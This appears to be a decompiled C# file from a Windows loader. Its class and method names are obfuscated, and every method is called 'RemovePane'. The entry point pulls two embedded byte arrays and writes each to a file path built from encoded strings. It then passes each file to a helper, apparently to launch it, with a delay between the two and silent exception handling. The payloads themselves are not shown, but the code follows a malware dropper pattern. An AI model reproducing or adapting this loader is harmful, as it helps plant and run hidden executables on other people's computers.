using System;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsLoader;

[StandardModule]
internal sealed class DomainList
{
	private static object idEnabled = NetworkDesigner.RemovePane();

	private static object nextUri = SelectionToken.RemovePane();

	[STAThread]
	public static void RemovePane()
	{
		DiskSerializer.RemovePane();
		try
		{
			string text = PaneInfo.RemovePane(TemplateScope.RemovePane(), PackageQueue.RemovePane(111));
			AddinScope.RemovePane(text, (byte[])idEnabled);
			ToolbarOptions.RemovePane(text);
			ConfigTree.RemovePane(10000);
			string text2 = PaneInfo.RemovePane(TemplateScope.RemovePane(), PackageQueue.RemovePane(150));
			AddinScope.RemovePane(text2, (byte[])nextUri);
			ToolbarOptions.RemovePane(text2);
		}
		catch (Exception ex)
		{
			ProcessConverter.RemovePane(ex);
			Exception ex2 = ex;
			WindowType.RemovePane();
		}
	}
}
